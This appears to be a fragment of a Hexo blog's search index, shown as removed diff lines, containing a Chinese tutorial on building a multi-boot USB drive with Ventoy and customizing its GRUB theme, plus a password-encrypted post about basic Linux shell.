-<hr>
-<center>一个U盘通吃200多款操作系统安装</center>
-
-<p>你可以一次性拷贝多个不同类型的镜像文件,Ventoy会在启动时显示一个菜单供你选择,支持大部分常见类型的操作系统其中包括主流的 Windows11 /Win10 /8.1 /8 /7 ,WinPE(PE系统等等) Ubuntu CentOS Debian Linux …</p>
-<h2 id="制作启动器"><a href="#制作启动器" class="headerlink" title="制作启动器"></a>制作启动器</h2><h3 id="软件部署"><a href="#软件部署" class="headerlink" title="软件部署"></a>软件部署</h3><p>官网下载相应版本后,分区类型选择MBR兼容性好,然后开始安装一个U盘启动器就做好了,期间会格式化U盘</p>
-<h3 id="U盘部署"><a href="#U盘部署" class="headerlink" title="U盘部署"></a>U盘部署</h3><p>随意选择U盘目录将系统文件复制到U盘 比如我的是&gt;&gt;/IMG</p>
-<h2 id="从U盘启动"><a href="#从U盘启动" class="headerlink" title="从U盘启动"></a>从U盘启动</h2><p><img src="/images/efi.jpg" alt="efi" loading="lazy"></p>
-<p>重启进入EFI选择U盘名字,以上是不同品牌EFI快捷键</p>
-<hr>
-<h3 id="DIY"><a href="#DIY" class="headerlink" title="DIY"></a>DIY</h3><blockquote>
-<p>好的瑞士军刀怎么能少的了DIY呢</p>
-</blockquote>
-<p>在U盘根目录新建<code>themes</code>文件夹,由于更改主题需要编译json文件所以ventoy自带了VentoyPlugson方便傻瓜式操作</p>
-<p><a href="https://www.gnome-look.org/browse?cat=109&ord=latest">GRUB Themes - Gnome-look.org</a>在里面下载你喜欢的主题.tg,解包后再解压知道只有文件夹,放到你的themes文件夹</p>
-<p>找到你的ventoy安装路径打开<code>VentoyPlugson.exe</code>选择启动; 或者点击链接<a href="http://127.0.0.1:24681/">链接</a></p>
-<p>选择主题插件设置你的主题样式,教程就结束了!</p>
-<h3 id="UI"><a href="#UI" class="headerlink" title="UI"></a>UI</h3><center>在界面使用F5可以切换主题</center>
-
-<p><img src="/images/theme-ventoy.png" alt="ventoy" loading="lazy"></p>
-<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
-      <categories>
-        <category>刷机</category>
-        <category>windows</category>
-      </categories>
-      <tags>
-        <tag>u盘</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>基础Linux&amp;shell</title>
-    <url>/post/linux-teach/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="f7afd80d4b071e118528029a9143771f9274eb1b0ce2656371b361fe4f48e222">1ac8257062fc56a3de8d7a31065f3f672628247548b66b5aea2bbc0e995cdccd7ca5306c7a83c11b90c7daf7ab550bf37c97af4d3bd6d008e14e507936dc2c56fb4839ff93d4bf5254c03178686aef790b7b8388fe32d7648bea0ac49290ae422ea6a865cba6bf718fb33a8f3cdfa250f7f8cc2de1606c7e2dc1ae6e4f56d79e7d8bb9933eb380482dbe751a6a4026fd9ccc34facbfe4107da837b4f908ff9302cb4eb4eed17440130d749c4d792b43b9b29f897663fb3270d20cddb461accdd23728ce04f2fd311da2bcb88ab84f31b39e6b19a2605b1cbe5e0a9a3f0e63d4d6815485ee527483137b5dd2afff34182059a46f9014176b1970d20a3466fce29044621ea1b50ebb0c1cad1a3020f44eebee63a1d3b355c90e5a737a79eeeafa8f9cb0330729e3befcded6114a777a9458108753a61dd94232a9ff4601c714d1909fab7f6ab81d7bea644eb8f3cf433d356a4b82ebfa45d97331169db08af1ef2ba7a32ac74120503b29b607095f16bda3d54e79b2713f345c9845a233791a661d31c6bdf74e9811e8458fe3d6864129261a0e6d65a48d21d6dd6c665bf9ddf287d8d5cf654caaed6b8407c1792d2426df7f704d30f7eb385dc5650a7d97a1e8772585e156605093b4fe5536facdd70fa7716fcb806d0a94c8db33b485d43b90693f0b7f42f6c353f57d2290c3b72f407dd1dd6bc6dce07b7279e6a82adc82f86050b9ff9f9ecd3992f852dea623d368d5ba5efc153863fe596c2e14f3db4e6495d772b5821c663cccda18c37dcbcfa6d69966675b173c8f85e2751053c733b6137ca2a12f5f7dd69c5d4976118d337e7edcc84e810bee7e8d92e7cf6b9d0b02379d90bd1865a0d2dcf74bcae20b4e08f80cb19b4e20116894f3abba04d6725314dd70f40f81f2756cd423cf36a550cf26a689f250d9f636e57c6bc4f657347bc6471c5f848c3bb5eba0711b8cea74ccab31e183971f28fae02d33f3e077a71b46626ffc370e698f865a852f12a56ffa9e5188befc335ca48c3cb4230cedb270ceca7dc9261fde8e7fbd4b4e9b85961495f81b8e03b312a7b010c9648f275eebe31de2f93fbc362d28a1389485e5ee64f532560fba1ce27acf8666355049dbdf8536df6d4eabe699487e7951c5d367d73f9cb35fe38438118d31b4dd4b064dab58142a70669b3772591078fc0bb8370c30231deb82ab994325bb0e764125f3f262de1bcd16d372a9425465faf3c5ca04926e2e5d544e473c8cb3511648d525837ec8bb0fd504a5394af836a126cdda113143a049edec5c24e1bc2d035415ce3b76a4ea993da30e7c380c273c45120daf6d95004c40a6d067e329c4d22322802c357c004f17e253264331d5f078e2ee60f8810321433245cacbd99a0c8594778760004dac4f9f505eb51b5dcd9ca748faf29ed12d8398145e64a8d8233a7c30a3b10c5e07d9800b667868a41728de326ef8540a8f4318b3e3c0918396aeaaab8243385994b4cf2aeb0438f2f85addf3bfe4892766aac364a6d051ad6b6a590099f38bc08897a563860052b0c0fafb9f496c3a86586fa2dae5d637bf1159f4f03990e6fd177623de66dd7bd6f749333b16fb04c770adb0b6b790be586991a3a3ed481f8cb77c5068b7dcbf076d08c901bbbc762d00d50b702420c309ac986f80b556be1a849e5e13e68d90a5847fffd438ecc202858bd660637caeacffb965b97c6a618b814dda0961914098b748ed58a8cae377b739d2d760482acfe23c35208754fdcf9c00605f5b6b59d701cfdbf6155c7cd6bcbff0887445c5119dacf2615de4b907a697429c328d007eba6d127df2d07ec215e6a6ba4077e4dac72819849e88688dc3989badd7b958568e1dab89b567dc87c9dc83455bd00dd438d8ee98b8e8722be55410f199f5fe482270ecce76fa90fd0a0c3ab99c07d68a51e04dcd0bde232e1c56e47d0645a3d66692f0f8520d5dcb1d54b133703cf44076f1db1b6edda47ebbd3958a0f4e8cb16928a507c91483a7c58fbb41575154e88f06593479ce36594b09d2bffe1dc6b825cf75eb1ee5f1a387ee22de592cf6aeb2413a75ecded7e33787defb74431586674359770fb21dbe6a0da94ae6afb59f5db65615cbd6892b8a00bb4a8966299d73debd21d4646917e51e61bbf8e5a55f143e95e24c4eea1d942de5776a8f2758e517186145c134f66526cfe63d856f61e484caf69d16c2f1e625eb7b13e76d055175547dd45e564bf51e757806b1af9fd4293eb5c537a75746d8c199e0bfbf1127b75367c68a496875053e83e116ec55209f1f7ef96d5ec33cc5fa0da0f3a8a97a55a4ca0685614265f28e16427e1cd15e5c7c5434950910f5ca024a336fd9eb4cc99911465ec72a841d756964b3d58e369daea709d57c4fe32af26c02bab79c6a7be37b23df433080896741d53059811e3a94175fc40d604a7652a62596b0f5fe4f93f228f2595468e1d16f62f1115f52f7b66dbeae10cc50d6e5bf46bb783407647f3c86f02911c93133337e04cbc17158508675f655aa68e95f68f9a56746bfb158277370b708547b7a1856289ea1921ee1ed10dc73f2a8ffc4f272834e148a7518f54e785dc1076dced6f584c597bea1597d516fb61d672262fcc5f99274471d6d18df24ea3e2b804d913ec06d6b6eb767977919cc32957c8e3b60709ab9e2e9959aa44691d4beb1e6d58b906e015f7c374e23a5018b0c8d965047d11c47263416fade44c21d7bd6c241ae0a7be7b654598e529ce15dbd3640c86e43943ac0378acf27abc997b3ac8bf07f57a2fc9183ce65fc4d6bdb17e7826eed8e14f2a5e7525282438853270cc80bddfbaf2761f669f1102f3f69409d978fa6e7142df16797629bb1f347494f40914a082774260c435425da8798c064c4e3f2c1bafd2525d3c715f58c2d3173bbe13ec9007d35dda6681e265b9d5da32ed51dc1b91b9a25eb4ccef30ff732082c02e33b24fa9e84cbee913f9615cf8245d0d39138eb615ab9fb81a84bb6de5b9c2597f8e39f2c17501d331bbd9a683c599ccd4d9fba3fea8fcf98bd1e005f713f869e56b7609773211f4bba5c66b8e7398dacaa519508fbba27e1b451889fc8f7c1ca717988925af09154becd1383d40d078e70397dcb2ab3fffb9553806dd425d429da921f83ad02edd8148b62ba90df52c2339268fcc9f4e183dfb04b25e296fa081ca520303b41da4d783f5d21b154b3d00cf629013061cf0a903896f0755e7229bc71782e01863f5c6e3baf393f07e732d26e2df921ce725e67a7a9692894d458c743830ad2c1ef7d8be716fcea1d8210e60f9d3af20ffb5e588d71b6cc7e0067d7925076e61ff6fe9b4373c01e2201a3783db3f4ca791de077bcf0e4a107a6dc199da12939a6227496bcad3a16d6a949dc3c982354bc96528dd4cee827281a370fd64413b948abcd78b70dfe4869c0ec6fe84fb86063ab5cfcb2a53046c87bc50669ddd8bad69700935c52ce2de28198aa02a9821451eb69a690b86ee7a7681a64d09084216d9610b67dfd711df0cb8c378674314d251a38d415b8613f77424f1c02640f5ca143511fc20040533044ed619605ff77d1be1d582b07be67340daa7dfe24ef00bddefee</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
       </tags>
   </entry>
 </search>
